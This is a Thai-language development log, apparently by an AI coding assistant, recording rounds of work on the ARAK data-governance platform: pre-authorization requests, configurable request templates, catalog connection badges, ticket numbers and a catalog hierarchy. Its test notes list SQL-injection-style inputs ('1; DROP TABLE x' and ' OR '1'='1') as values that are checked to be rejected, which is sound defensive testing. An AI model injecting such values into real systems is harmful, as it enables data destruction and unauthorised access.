
### BO.1 Migration — **V30 `access_request_preauthorization`**
- `access_request.kind` (`ASSET` default | `PREAUTHORIZATION`) + `target` jsonb · CHECK: `kind = PREAUTHORIZATION` ⇔ มี `target`
- CHECK: pre-authorization เติมเต็มได้ด้วย `POLICY_UPDATED` / `POLICY_CREATED` เท่านั้น — **ไม่มีทางเป็น GRANT** แม้ข้าม service
- unique "คำขอเปิดได้ใบเดียวต่อคนต่อตาราง" ใช้เฉพาะ `kind = ASSET` — คนเดียวเปิด pre-authorization บน scope เดียวกันได้หลายใบ (คนละกลุ่ม)
- `asset_fqn` = scope (service / database / schema / table / view) → workflow และ owner ของ scope เป็นคนตัดสิน เหมือนคำขอตารางข้างใน

### BO.2 Target (`Preauthorization.java`)
- `conditions`: 1–8 ข้อ `{facet, operator, value}` · facet = tag / classification / glossary / term / domain / dataProduct · operator `contains` (ครอบลูกหลาน) | `eq` (ชั้นนั้นชั้นเดียว) · value ≤300
- `subject`: ชนิดเดียวต่อคำขอ — `GROUP` (group / team ≤10) หรือ `ATTRIBUTE` (key + `eq/ne/gte/lte`) · `normalise()` ตัดช่องว่าง ตัดซ้ำ ตรวจทุกอย่างก่อนเขียน → ไม่ผ่าน = 400
- `describeTables()` / `describePeople()` เป็นประโยคที่ใช้ทั้งในหน้า request และ review

### BO.3 Coverage — `POST /v1/access-requests/preauthorization/coverage`
- บอกว่า **วันนี้** ครอบกี่ตาราง (ตัวอย่างชื่อตาราง ≤20) และกี่คน — **ไม่บอกชื่อคน** (ผู้ขอไม่ควรได้รายชื่อคนในกลุ่มจากช่องนี้) · นับคนได้สูงสุด 5000 เกินนั้นเป็น "at least"
- หน้า review ของผู้อนุมัติเท่านั้นที่เห็นชื่อ (ตัวอย่าง ≤20)

### BO.4 Review + draft policy (`AccessReview.preauthorizationReview`)
- กล่อง **What it covers**: Under (scope) · Tables where · For · Today: N tables · N people + รายการตาราง/คนที่เข้าถึง (Reaches / More)
- คนเกิน 50 (หรือ "at least") → คำเตือน wide audience
- เสนอ **"A policy for …"** เป็น subscription policy ที่ร่างจากคำขอ (selector จาก conditions ใต้ scope · subject จากกลุ่ม/attribute · validTo จากจำนวนวัน) → ปุ่ม **Open as draft policy** เปิด builder เป็น DRAFT ยังไม่ถูกบันทึก — **ต้อง activate ผ่าน policy lifecycle ปกติเท่านั้น** ไม่มีอะไรเปิดเองจากคำขอ

### BO.5 Configure
- เลือก GRANT ไม่ได้ (server ตอบ 400 "policy, not a grant" · ฟอร์ม Configure แสดงแค่ 2 ตัวเลือก policy)
- template ของ scope (BN) บังคับกับ pre-authorization เหมือนคำขอทั่วไป — purpose / reference / จำนวนวัน / until revoked

### BO.6 Frontend
- หน้าใหม่ **`/requests/preauthorize`** (`PreauthorizePage.tsx`) — ปุ่ม **Pre-authorize** ในหน้า Access requests · 4 ขั้น: scope (ค้น catalog) → ตารางที่มี (facet + contains/eq) → ให้ใคร (group/team หรือ attribute) → ทำไม/นานแค่ไหน
  - กล่อง "What it reaches today" นับสดจาก coverage
  - ขั้น 4 ถามตาม template ของ scope: guidance (text ล้วน) · purpose (dropdown ถ้ามีรายการ) · reason นับตัวอักษร · reference · ปุ่มวันตาม template (Built-in = 30/90/180/365) · Until revoked เฉพาะที่ template อนุญาต
- หน้า Access requests: badge **Pre-authorization** ในรายการและหัว detail · ไอคอนโล่ · กล่อง "Tables where / For" · ปุ่ม "Open in catalog"
- `RequestReview.tsx`: panel What it covers + draft policy

### BO.7 ผลทดสอบ
- `AccessRequestIT` **77/77** (nested *Preauthorizing*: normalises · asks · reviews · noGrant) · `AccessRequestResourceTest` 9 · `RequestTemplateResourceTest` 5
- tsc ผ่าน · jest **474/474** (`PreauthorizePage.test.tsx` 7 · `AccessRequestsPage.test.tsx` + pre-authorizations) · build ผ่าน
- dev: analyst_a ขอ scope `demo-pg.salesdb.sales` · Domain contains Finance · team Finance → **REQ-000021** (template Sales database บังคับ purpose → หน้าถามตาม template) · admin เห็น What it covers (1 table · 3 people) + "A policy for team Finance" → Open as draft policy

---

## รอบก่อนหน้า — **ข้อ BN: Request access template — ฟอร์มขอสิทธิ์ตั้งค่าได้ใน Settings ตาม scope / tag ของตาราง** (Preauthorization เลื่อนเป็น BO — ยังไม่ commit · M28 ยังไม่ commit)

ผู้ใช้: *"Request access ควรจะออกแบบเป็น Form ให้กรอกหรือเปล่า หรือมี Template ให้ใส่ โดยสามารถ Configure Template ได้ใน Setting"* → *"ทำต่อเลย Request access template ด้วยนะ"*

### BN.1 Migration — **V31 `access_request_template`** (ตอนนี้ V1–V28 + V31 บน main · V29 = M28 · V30 = Preauth ยังไม่ commit → Flyway เปิด `outOfOrder(true)` แล้ว)
- `access_request_template`: `name` (unique ไม่สนตัวพิมพ์) · `description` · `scope_fqn` (null = ทั้งองค์กร) · `match_facets` jsonb (tag / classification / glossary / term — ว่าง = ทุกตารางใต้ scope) · `enabled` · `form` jsonb
- `audit_access_request_template` append-only (CREATE / UPDATE / DELETE + before/after)
- `access_request` + `template_id` (ON DELETE SET NULL) · `template_name` · `reference` (≤200) → **แก้หรือลบ template แล้วคำขอเดิมยังเหมือนเดิม**

### BN.2 Form ที่ template กำหนด (`RequestTemplate.Form`)
- `purposes` (≤30 ตัว ตัวละ ≤100) + `purposeRequired` · `durations` preset (≤8) + `defaultDays` + `maxDays` (≤365) + `allowUntilRevoked` (ห้ามคู่กับ `maxDays`) · `referenceLabel` (≤60 เช่น "DPIA number") + `referenceRequired` · `minReasonLength` (≤500) · `guidance` (≤2000 — **plain text เท่านั้น** render เป็น text + `whitespace-pre-line` ไม่มี HTML)
- template ที่ขัดกันเอง (default > max, preset เกิน max, บังคับ reference แต่ไม่มี label ฯลฯ) → 400 ก่อนเก็บ · ชื่อซ้ำ → 409

### BN.3 เลือก template ของตาราง (`RequestTemplateStore.effective`)
1. เอา template ที่ enabled และ scope ครอบ fqn (ทีละ segment ไม่ใช่ LIKE)
2. ตัวที่มี `match_facets` ต้อง match facet ของตาราง **หรือ column ใด column หนึ่ง** (hierarchical — `PII` ครอบ `PII.Sensitive`)
3. ลำดับ: ตัวที่ระบุ facet ก่อน → scope ลึกกว่า → ชื่อ · ไม่เหลือ → **Built-in** (reason + ระยะเวลา แบบเดิม — ไม่มีอะไรเปลี่ยนสำหรับ org ที่ไม่ตั้ง template)
- `GET /v1/request-templates/effective/{fqn}` เปิดให้ทุกคนที่ login — **ตัด `scopeFqn` / `matchFacets` ออก** ผู้ขอไม่รู้ว่าเลือกเพราะ tag อะไร

### BN.4 Server เป็นคนบังคับ ไม่ใช่ฟอร์ม
- `AccessRequestStore.submit` หา template ของตารางเอง แล้ว `check()` คำตอบ (reason ยาวพอ · purpose อยู่ในรายการ · ไม่เกิน maxDays · until-revoked เฉพาะที่อนุญาต · reference) → ไม่ผ่าน = 400 ไม่ว่าฟอร์มส่งอะไรมา
- **template ไม่อนุมัติอะไร ไม่เปลี่ยนว่าใครอนุมัติ ไม่เปิด policy** — ผู้อนุมัติยังเป็นของ access workflow

### BN.5 สิทธิ์ (`RequestTemplateResource`)
- อ่านรายการ + history: PLATFORM_ADMIN · POLICY_AUTHOR · DATA_OWNER · AUDITOR (auditor อ่านอย่างเดียว) · Requester อ่านได้แค่ effective
- template ทั้งองค์กร (scope null): PLATFORM_ADMIN เท่านั้น · template มี scope: คนที่ดูแล scope นั้น · ย้าย scope ไปที่ตัวเองไม่ได้ดูแล / ลบของ scope อื่น → 403

### BN.6 Frontend
- `api/requestTemplates.ts`: type + `checkAnswers()` (ลำดับเดียวกับ server) + `describeForm()`
- `RequestAccess.tsx` → `RequestAccessForm` render ตาม template: guidance (role=note) · purpose dropdown · reason นับตัวอักษร · reference · ปุ่ม preset วัน + ช่องวัน "at most N" · ป้ายชื่อ template มุมขวาบน · ปุ่ม Send ปิดจนกว่าจะครบ
- หน้าใหม่ **Settings → Request templates** (`/settings/request-templates`, `RequestTemplatesPage.tsx`): 3 กลุ่ม *By tag or term* / *By scope* / *When nothing else applies* (Built-in) · การ์ดมี Preview ("What the requester sees") · History · Edit · Delete (ยืนยันก่อน) · editor มี live preview ข้างๆ + ช่อง tag/term มี datalist จาก vocabulary (ไม่รวมตัวที่ disabled)
- หน้า Access requests / Review แสดง **Form `<ชื่อ template>`** ข้าง Workflow + **Reference**
- การ์ดใหม่ในหน้า Settings

### BN.7 ผลทดสอบ
- `AccessRequestIT` **73/73** (nested *request templates* 6 ตัว: built-in · tag บนตาราง/column · facet ชนะ scope ลึก · server บังคับ · แก้/ลบแล้วคำขอเดิมไม่เปลี่ยน · template ขัดกันเอง) · `RequestTemplateResourceTest` 5 · unit รวม 28 ผ่าน
- tsc ผ่าน · jest **464/464** (`RequestTemplatesPage.test.tsx` 8 · `RequestAccess.test.tsx` 24) · build ผ่าน
- dev: seed "PII tables" (ทั้งองค์กร · PII · purpose 3 ตัว · 7/14/30 วัน สูงสุด 30 · DPIA number บังคับ · reason ≥20) + "Sales database" (`demo-pg.salesdb` · Change ticket ไม่บังคับ) → screenshot analyst_c ขอ `dtp-iprm.iprm.public.customers` ได้ฟอร์ม PII ถูกต้อง · compliance_a เห็นหน้า Settings อ่านอย่างเดียว

---

## รอบก่อนหน้า — **ข้อ BM: Catalog บอกว่าอะไร Query ได้จริง / เป็นแค่ Metadata · มาจาก OpenMetadata หรือไม่ · ชื่อผู้สร้างใต้ © · น้องรักษ์ (NokRak) พูดได้** (Preauthorization กำลังทำ — ยังไม่ commit · M28 ยังไม่ commit)

ผู้ใช้: *"ในหน้า Catalog แสดงให้เห็นด้วย ว่าอันไหน ไม่ได้ต่อจริง database ใน Arak เป็นแค่ Metadata หรือจะแสดงว่าอันไหนต่อจริง Query ได้"* + *"ในทางกลับกันก็ควรต้องมีบอกว่าอันไหนมีต่อ Catalog มาจาก OpenMetadata อันไหนไม่ได้ต่อ"* · *"© 2026 MFEC ข้างล่างเขียนตัวเล็กๆว่า <ชื่อผู้สร้าง>"* · *"ตรง icon mascot มี quote … แบบสุ่ม"* + *"Assistance Mascot ชื่อ NokRak · ภาษาไทยคือน้องรักษ์"*

### BM.1 Catalog — 2 แกน แสดงทั้งสองขั้วเสมอ
- **Connection**: `Queryable · <source>` (เขียว จุดทึบ) หรือ `Metadata only` (เทา ขอบประ จุดกลวง) — ขั้วบวกมีสี ขั้วลบเป็นเทา → ตาหาตัวที่ query ได้เจอทันที ส่วนตัวที่เป็น metadata (ส่วนใหญ่ของ catalog) ไม่ตะโกน
- **Catalogued by**: `OpenMetadata` (ม่วง) · `Read from source` (ARAK อ่านจาก DB ผ่าน JDBC — ไม่มีใน OM) · `ARAK only` (local)
- นิยาม Queryable = มีแถว `asset_fqn_map` (ไม่ ORPHANED) ของ asset นี้หรือของอะไรข้างใต้ ชี้ไป `data_source` ที่ **enabled** — **คือ mapping ชุดเดียวกับที่ `QueryService` ใช้ resolve ตาราง** → ป้ายกับสิ่งที่ query ได้จริงเป็นชุดเดียวกันโดยโครงสร้าง ไม่ใช่บังเอิญตรงกัน · ปิด source (enabled=false) → ป้ายหายทันที
- backend: `CatalogQuery.AssetSummary` + `provenance`, `querySource` (ทั้ง list และ detail) · `assets(... Boolean queryable, String origin ...)` overload ใหม่ (ตัวเดิม 7/8 arg ยังอยู่ — mock เดิมไม่พัง) · `GET /v1/catalog/assets?reach=queryable|metadata&origin=openmetadata|discovered|local` ค่าแปลก → 400 (มาจาก picker เหมือน sourceId)
- frontend: `pages/catalog/reach.tsx` (`ReachBadges`, `ReachBadge`, `OriginBadge`, `reachSentence`) · การ์ดใน List (มุมขวาบนข้าง FQN) · แถวใน Hierarchy · ตาราง Contents ของ container · หน้า detail: stat **Connection** แทน Source พร้อมประโยคอธิบาย · filter 2 ตัว **Any connection / Queryable / Metadata only** และ **Any origin / From OpenMetadata / Read from source / ARAK only** (อยู่ใน URL) · legend ใต้หัวหน้า
- dev ตอนนี้: `dtp-iprm` (OM, 33 ตาราง) = Metadata only ทั้งหมด · `demo-pg` = Read from source + Queryable

### BM.2 Footer
- ~~`AppShell.tsx`: ใต้ `© 2026 MFEC` มีบรรทัดเล็กชื่อผู้สร้าง~~ → **เอาออกแล้ว** (ผู้ใช้สั่งให้เอาชื่อออก): footer กลับเป็น `© 2026 MFEC` บรรทัดเดียว truncate + tooltip "© 2026 MFEC. All rights reserved." เหมือนก่อน BM ทุกตัวอักษร · ห้ามใส่ชื่อจริงกลับเข้า UI อีก

### BM.3 น้องรักษ์ (NokRak)
- `assist/nokrak.ts`: ชื่อ + ชุดคำพูดตามหน้า (idle / sql / policy) มีไทยปน · `pickLine(mode, random)` สุ่ม · ไม่มีคำพูดไหนอ้างว่า run / approve / activate ได้ (ตรงกฎ LLM draft-only) · หน้าที่ไม่มี query console ไม่เสนอเขียน SQL
- `AssistDock`: กล่องคำพูดข้างปุ่มมุมขวาล่าง — ทักครั้งเดียวต่อ session 7 วิ (`sessionStorage`, try/catch) + ขึ้นเมื่อ hover/focus (สุ่มใหม่ทุกครั้ง) · หัว panel เป็น "NokRak · น้องรักษ์ · Assistant" · aria-label ของปุ่มคงเดิม
- เทสต์ `nokrak.test.ts` (ขอบของการสุ่ม · SQL เฉพาะหน้า sql · ไม่มีคำอ้างว่าทำแทนคน)

### BM.4 ผลทดสอบ
- `CatalogQueryIT` **22/22** (+2: `marksWhatAQueryCanReach` รวมเคส source ถูกปิด · `filtersByOrigin`) · `LlmAssistResourceTest` ผ่าน · tsc ผ่าน · jest **452/452** · build ผ่าน · screenshot ตรวจด้วยตา

### BM.5 คำถามผู้ใช้ที่ตอบแล้ว (ยังไม่ได้ทำ)
- *Request access ควรเป็นฟอร์มหรือ Template ที่ Configure ได้ใน Setting?* → แนะนำ **Template ที่ admin ตั้งใน Settings** แล้ว render เป็นฟอร์ม (ช่องบังคับตาม classification ของตาราง เช่น PII ต้องมี purpose + เลขอ้างอิง · ระยะเวลาให้เลือกจาก preset · ข้อความแนะนำ) — ลง Roadmap ต่อจาก Preauthorization
- *AI ใน Catalog / global search* → M28 ต่อจากนี้: โหมด catalog ใน dock + "Ask NokRak" ในช่องค้นหาด้านบน

---

## รอบก่อนหน้า — **ข้อ BL: หน้า Governance จัดเป็นตารางเดียว คอลัมน์ตรงกัน**

ผู้ใช้: *"หน้า Governance ยังจัดเรียงไม่ค่อยสวย"* — เดิมทุกค่าเป็นการ์ดแยกมีขอบของตัวเอง ลูกเยื้องด้วย margin · ตัวเลข assets / policies ลอยไม่ตรงคอลัมน์ · ปุ่ม Expand / Collapse ลอยกลางแถว · sub-domain โชว์ FQN ยาวซ้ำชื่อพ่อ + description ที่ซ้ำชื่อตัวเอง

### BL.1 ที่เปลี่ยน (`GovernancePage.tsx` ไฟล์เดียว — frontend ล้วน)
- `VocabularyTable`: การ์ดเดียวต่อแท็บ · หัวตาราง **Name / Assets / Policies** ครั้งเดียว · แถวคั่นด้วย `divide-y` · คอลัมน์ Assets `w-36` + Policies `w-24` ชิดขวา `tabular-nums` → ตัวเลขตรงกันทั้งหน้า
- แถว: เยื้องด้วย `paddingLeft: 16 + depth*24` · root ตัวหนา · มี chip จำนวนลูก ("3 tags" / "4 sub-domains" / "2 terms") · hover เป็น `bg-secondary`
- FQN แสดงเฉพาะ root (ถ้าต่างจากชื่อ) · แถวลูกย้าย FQN ไปเป็น tooltip (`title`) — tree บอก path อยู่แล้ว
- description ที่ซ้ำชื่อ (ไม่สนตัวพิมพ์) ไม่แสดง · Assets = 0 เป็นสีเทา (ยังเป็นลิงก์ไป catalog เหมือนเดิม)
- toolbar: ช่อง Filter ซ้าย · Expand all / Collapse all ชิดขวา (`ml-auto`)
- Data products: ตารางแยกใต้หัวข้อของตัวเอง · Custom properties: ตาราง Property / Applies to · type / Values and description
- empty state: ไม่มีอะไรตรง filter → *"Nothing here matches “x”."* · ไม่มี custom property → บอกว่ายังไม่มีใน OM
- พฤติกรรมเดิมคงไว้ทั้งหมด: prune ตาม filter (เก็บพ่อของตัวที่ตรง) · expand/collapse all แบบ nonce · facet ของลิงก์ (classification vs tag / glossary vs term)

### BL.2 ผลทดสอบ
- tsc + build ผ่าน · jest **449/449** · screenshot 3 แท็บ (Classifications / Domains / Custom properties) ตรวจด้วยตา — คอลัมน์ตรง, sub-domain อ่านได้, empty state ขึ้น

---

## รอบก่อนหน้า — **ข้อ BK: เปิดคำขอเต็มหน้าที่ `/requests/REQ-000042` · ช่องค้นหาคำขอรอกด Enter** (M28 Agent ยังทำอยู่ — ยังไม่ commit)

ผู้ใช้: *"อยากให้สามารถกดดู Ticket นั้นเต็มหน้าได้ เช่น Click เข้าไป หรือเอา URL ไปเปิด"* · *"ทำไมที่ Search ตรงนี้ พิมตัวนึงแล้วมันหาเลย ไม่รอกด enter"*

### BK.1 หน้าคำขอเต็มหน้า
- route ใหม่ `/requests/:ticket` → `RequestPage` (export จาก `AccessRequestsPage.tsx`) · หาด้วย `fetchRequestByTicket` (endpoint เดิม `GET /v1/access-requests/ticket/{n}` สิทธิ์เดียวกับหาด้วย id — ไม่มี backend ใหม่)
- วาดด้วย `RequestDetail` ตัวเดียวกับแผงขวา → ปุ่ม Approve / Configure / Withdraw ครบตามสิทธิ์ · ของตัวเอง (`requesterUsername` = คน login) → ฝั่ง "mine" (Withdraw ไม่มี Approve)
- query key อยู่ใต้ `['access-requests', …]` → ตัดสิน/configure แล้วหน้ารีเฟรชเอง
- breadcrumb "‹ Access requests / REQ-000011" → กลับไป `/requests?tab=…&status=&id=…` (status ว่าง = All จึงเจอทุกสถานะ)
- ทางเข้า: ปุ่ม **Full page** บนหัวคำขอ (ไม่แสดงบนหน้าเต็มเอง) · เลข ticket บนหัวเป็นลิงก์ · copy URL ไปวางได้ตรงๆ
- ไม่เจอ / ไม่มีสิทธิ์ → *"There is no request REQ-000099 that you can see."* · ไม่ใช่รูปเลข ticket → *"“banana” is not a ticket number…"*
- deep link เปิดได้เพราะ `SpaServlet` ตอบ index.html ให้ทุก path ของ SPA อยู่แล้ว

### BK.2 ช่องค้นหาคำขอรอ Enter
- เดิมกรองทุกตัวอักษร (list กระโดด + ตัวที่เลือกหาย) → ตอนนี้พิมพ์เป็น draft · **กด Enter ค่อยค้น** (`<form role="search">`) · ลบจนว่าง / กดกากบาทของช่อง → รายการเต็มกลับมาทันทีไม่ต้อง Enter · `?q=` ใน URL ยังแชร์ได้ · placeholder บอก "Enter to search"

### BK.3 ผลทดสอบ
- jest **449/449** (ใหม่ 3: เปิดเต็มหน้าจากปุ่ม → URL `/requests/REQ-000011` + Approve อยู่ + ไม่มีลิงก์หาตัวเอง + breadcrumb · เปิดจาก URL ของตัวเอง → Withdraw ไม่มี Approve · ไม่เจอ / ไม่ใช่ ticket · test ค้นหาปรับให้ตรวจว่าพิมพ์เฉยๆ ไม่ค้น, Enter ค่อยค้น, ลบแล้วกลับมาเต็ม) · tsc + build ผ่าน
- **live**: `http://localhost:8090/Arak/requests/REQ-000011` ตอบ 200 + bundle ใหม่ · API `REQ-000011` / `req-11` → 200 คำขอเดียวกัน · `REQ-999999` → 404 · `banana` → 400

---

## รอบก่อนหน้า — **ข้อ BJ: Catalog แสดงเป็น hierarchy — Service → Database → Schema → Table** (M28 Agent ยังทำอยู่ — ยังไม่ commit)

ผู้ใช้: *"ใน Schema ก็ต้องแสดง list Table สิ · ใน Database ก็ต้องแสดง list Schema, dataset สิ · แสดงดูเป็น hierarchy ได้"*

### BJ.1 Backend — `?parent=` + `childCount`
- `CatalogQuery.AssetSummary` มี `childCount` (ท้ายสุด) = จำนวน asset **ปัจจุบัน** (`is_current`) ที่ `parent_fqn` ชี้มาที่ตัวนี้ — subquery เดียวกันทั้งรายการและหน้า detail
- `CatalogQuery.assets(...)` overload ใหม่ 8 ตัวแปร มี `parent` → `AND a.parent_fqn = :parent` (bind ไม่ต่อ string) · ตัว 7 ตัวแปรเดิมเรียกต่อด้วย `parent = null` → ผู้เรียกเดิม (รวม LLM catalog search) ไม่ต้องแก้
- `GET /v1/catalog/assets?parent=<fqn>` — ลูกโดยตรงของ container หนึ่งตัว · ผสมกับ `q` / `type` / facet ได้ · สิทธิ์เหมือนรายการ catalog เดิมทุกอย่าง
- ไม่มี migration ใหม่

### BJ.2 Frontend
- `pages/catalog/hierarchy.tsx` (ใหม่): `isContainer` (SERVICE/DATABASE/SCHEMA) · `childLabel` ("3 schemas", "1 table") · `childrenTitle` (Databases/Schemas/Tables) · `AssetTree` · `ChildrenPanel`
- **หน้า Catalog** — ปุ่มสลับ **List / Hierarchy** ขวาของแถวค้นหา (`?view=tree` อยู่ใน URL แชร์ได้)
  - Hierarchy = tree (`role="tree"`) เริ่มที่ service · **โหลดทีละชั้นตอนกางเท่านั้น** (`?parent=`, สูงสุด 500 ต่อชั้น เกินนั้นบอก "Showing X of N — open … to search them")
  - ชั้นที่มีลูกตัวเดียวกางให้เอง (service ที่มี database เดียว) · แต่ละแถว: icon ตามชนิด · ลิงก์ไปหน้า asset · badge ชนิด · "N schemas" / "N columns" ด้านขวา
  - เปลี่ยนตัวกรอง / ค้นหาใดๆ → กลับไป List เอง (ตัวกรองใช้กับ list เท่านั้น) · ตอนดู tree ไม่ยิง query รายการ
- **หน้า asset ของ Service / Database / Schema** — แท็บใหม่ถัดจาก Overview ชื่อตามของข้างใน (**Databases / Schemas / Tables**) พร้อมตัวเลข · **ไม่มีแท็บ Columns** (container ไม่มี column) · หัวหน้าแสดง "Contains: 2 tables" แทน Columns
  - ตารางลูก: ชื่อ (ลิงก์) + badge + description · Contains · Governance chips · ช่อง **Filter tables** กรองชื่อ/description · ว่าง → *"The crawl found nothing under this schema."*
  - ลิงก์ `?tab=contents` ไปหน้า table (ไม่มีแท็บนี้) หรือ `?tab=columns` ไปหน้า schema → เปิด Overview แทนหน้าว่าง

### BJ.3 ผลทดสอบ
- IT `CatalogQueryIT` **20/20** (ใหม่ 2: เดิน SERVICE→DATABASE→SCHEMA→[CUSTOMER, ORDER] · ค้นภายใน parent · childCount ในรายการและ detail · recrawl ที่ ORDER หายไป → นับแค่ของปัจจุบัน) · `LlmAssistResourceTest` ผ่าน
- frontend: tsc ผ่าน · jest **446/446** (ใหม่ 6: tree เดินทีละชั้น + ยิง `parent` ตอนกาง + ลิงก์ + aria-level · สลับ List/Hierarchy แล้วค้นหากลับเป็น list · แท็บ Tables ของ schema + ไม่มี Columns · filter · ว่าง · table ไม่มีแท็บ contents) · build ผ่าน
- **live** (dev app): 3 services → databases → schemas → tables ครบ · `childCount` ตรงกับจำนวนลูกจริงทุกชั้น (เช่น `dtp-iprm.iprm.public` = 33) · ทุกลูกชี้ parent ถูก · parent ที่ไม่มี / parent แบบ `' OR '1'='1` → 0 แถว · proxy :8090 เสิร์ฟ bundle ใหม่ที่มี tree แล้ว

---

## รอบก่อนหน้า — **ข้อ BI: เลข Ticket ของคำขอสิทธิ์ (REQ-000042) — ค้นหา / อ้างอิงได้** (M28 Agent ยังทำอยู่ — ยังไม่ commit)

ผู้ใช้ขอ: *"Access requests ต้องมีเลข Ticket เก็บไว้ด้วยนะ เอาไว้ Search หรือ Ref"* · แล้ว *"ไม่เห็นแสดงเลข ticket ในหน้า UI Access Request เลย"* (ตอนนั้น dev app ยังไม่ได้ restart — restart แล้วเห็น)

### BI.1 Migration — **V28 `access_request_ticket`** (ตอนนี้ V1–V29)
- sequence `access_request_ticket_seq` + column `access_request.ticket_no bigint NOT NULL UNIQUE DEFAULT nextval(...)` · sequence `OWNED BY` column
- คำขอเดิมได้เลขตามลำดับที่สร้าง (`row_number() OVER (ORDER BY created_at, id)`) → คำขอเก่าสุดคือ REQ-000001 · `setval(max+1, false)` ต่อจากนั้น
- ⚠️ **ย้าย `V28__llm_feature_access.sql` ของ M28 ไปเป็น `V29__llm_feature_access.sql`** (ยังไม่เคย apply ที่ไหน จึงเปลี่ยนเลขได้) — แต่ jar ที่ใช้รัน dev รอบนี้มี V29 ติดไปด้วย (อยู่ใน target/classes) **dev DB จึง apply V29 แล้ว → ห้ามแก้เนื้อ V29 อีกโดยไม่ `flyway repair`**
- เลขเรียงกันเดาได้ — ไม่เป็นไรเพราะเปิดอะไรไม่ได้: ค้นด้วยเลขผ่านการตรวจสิทธิ์เดียวกับค้นด้วย id

### BI.2 Backend
- `AccessRequestStore.StoredRequest.ticket` (ต่อจาก `id`) = `REQ-%06d` · `ticket(long)` · `ticketNumber(String)` อ่านได้ทุกแบบที่คนพิมพ์: `REQ-000042` / `req-42` / `REQ 42` / `#42` / `42` (≤ 12 หลัก, > 0)
- `findByTicket(typed, actor)` → หา id จาก `ticket_no` แล้วเรียก `find(id, actor)` ตัวเดิม · พิมพ์ผิดรูป → 400 *"A ticket number looks like REQ-000042."* · ไม่มี **หรือ** ไม่ใช่เรื่องของคนถาม → 404 *"No access request REQ-xxxxxx"* เหมือนกันทุกตัวอักษร **ไม่หลุด UUID**
- `GET /v1/access-requests/ticket/{ticket}` (ประกาศก่อน `/{id}`)

### BI.3 Frontend — หน้า Access requests
- ทุกแถวในรายการขึ้นเลข ticket (font mono) นำหน้าบรรทัดที่สอง
- หัวคำขอ: chip เลข ticket + ปุ่ม copy (`Copy REQ-…` → `Copied REQ-…`) ข้าง badge สถานะ
- ช่องค้นหา *"Ticket, table or person"* ใต้ตัวกรองสถานะ → `?q=` ใน URL (replace ไม่เพิ่ม history ทีละตัวอักษร) · ค้นในรายการที่โหลดแล้วด้วยเลข ticket / table / คนขอ / purpose / เหตุผล
- ถ้าพิมพ์เป็นเลข ticket แต่ไม่อยู่ในรายการ (เก่าหรืออยู่นอกตัวกรอง) → ถาม server `GET /ticket/{n}` · ไม่เจอ → *Nothing here matches "…"*
- `api/accessRequests.ts`: `ticket` · `fetchRequestByTicket` · `ticketNumber` (regex เดียวกับ server) · `matchesSearch`

### BI.4 ผลทดสอบ
- IT `AccessRequestIT.Asking` ใหม่ 2 ตัว: เลขไม่ซ้ำ + รูปแบบ + reload แล้วเลขเดิม + ค้นได้ทุกการสะกด (owner และคนขอ) · คนนอกได้ 404 ข้อความเดียวกับเลขที่ไม่มี · input ผิดรูป (`""`, `REQ-`, `REQ-0`, `abc`, `1; DROP TABLE x`, `-4`) → INVALID — AccessRequestIT + AccessDashboardIT + DashboardIT **84 IT + 24 unit ผ่าน**
- frontend: tsc ผ่าน · jest **440/440** (เทสต์ใหม่ 4 ตัว: เลขในรายการ + หัว · ค้นด้วย req-8 / #7 / orders · ถาม server เมื่อไม่อยู่ในรายการ · ไม่เจอ) · build ผ่าน
- **live** (dev app จริง): Flyway V28 + V29 success · คำขอ 20 ตัวได้ REQ-000001…REQ-000020 · inbox / mine ทุกแถวมี `ticket` ไม่มี key ที่เป็น ip · `/ticket/1` → 200 REQ-000001 · `/ticket/REQ-999999` → 404 ไม่มี UUID · `/ticket/abc` → 400 · proxy :8090 เสิร์ฟ bundle ใหม่ที่มีช่องค้นหาแล้ว

---

## รอบก่อนหน้า — **ข้อ BH: หัวคำขอติดอยู่บนจอตอนเลื่อน · M30 IaC + Configuration as Code ลง Roadmap** (M28 Agent ยังทำอยู่ — ยังไม่ commit)

### BH.1 หัวคำขอหายตอนเลื่อน — *"หน้า Request เวลาเลื่อน Scroll bar ลงมา Header ของ Request อันนั้น ไม่เห็นเลื่อนลงมาด้วยเลย"*
- `AccessRequestsPage.tsx` — หัวของคำขอ (`data-testid="request-header"`) เป็น `tw:sticky tw:top-16 tw:z-20` ติดใต้ TopNav (สูง 4rem) · มีพื้น `bg-primary` + มุมบนมนเอง
- การ์ดคำขอ **เอา `overflow-hidden` ออก** — ถ้ายังอยู่ sticky จะติดกับการ์ดแทนหน้าต่าง (เลยไม่ติดเลย) · นี่คือเหตุที่ของเดิมไม่ทำงาน
- รายการคำขอทางซ้าย `tw:lg:sticky tw:lg:top-20` อยู่ข้างๆ ตลอดตอนอ่าน review ยาวๆ (จอเล็กเรียงบนลงล่างเหมือนเดิม)
- เทสต์ใหม่ *keeps the request header in view while a long review scrolls* — เช็ค sticky + top-16 · การ์ดไม่มี overflow-hidden · ลิงก์ FQN อยู่ในหัว

### BH.2 M30 ลง Roadmap — *"การทำ Infrastructure as a code IaC, Configuration as a code · CI/CD Gitlab Github · template · CLI, API, Yaml file"*
ยังไม่ได้เขียนโค้ด — design อยู่ใน DESIGN.md **FR-20** + แถว M30:
- **IaC** (ติดตั้ง ARAK): docker-compose ที่มีแล้ว + Helm chart + Terraform module · secret จาก platform เท่านั้น
- **CaC** (ค่าตั้งใน ARAK): YAML `apiVersion: arak/v1` · `kind` = DataSource / Policy / Workflow / RoleBinding / FeatureAccess / HomePersona · `spec` ของ Policy = Policy IR ตัวเดิม
- CLI `arak validate | plan | apply | export | test | drift` = API `/v1/config/*` ตัวเดียวกัน · login ด้วย PAT (ต้องมี M14)
- template GitHub Actions + GitLab CI: PR → validate + test + plan + comment · main → dev · uat/prod ต้องกดอนุมัติ
- กติกา: credential เป็น reference (`vault://` / `azurekeyvault://` / `env:`) เท่านั้น · policy ลงเป็น DRAFT เว้นแต่ PR ถูก approve โดยคนอื่น · ไม่ลบของที่ไม่อยู่ในไฟล์ถ้าไม่สั่ง `--prune` · ไม่มี IP / credential ใน export
- ต่อยอด FR-9 Policy-as-Code (ยุบเข้า M30 แล้ว)

### BH.3 ผลทดสอบ
- frontend `npx tsc --noEmit -p .` ผ่าน · `npx jest` ชุด requests ผ่าน 50/50 (รวมเทสต์ใหม่)
- `git push` จาก session นี้ยังทำไม่ได้ (Git Credential Manager ต้องเปิดหน้าต่าง) — ผู้ใช้ต้องรัน `git push origin main` เอง

---

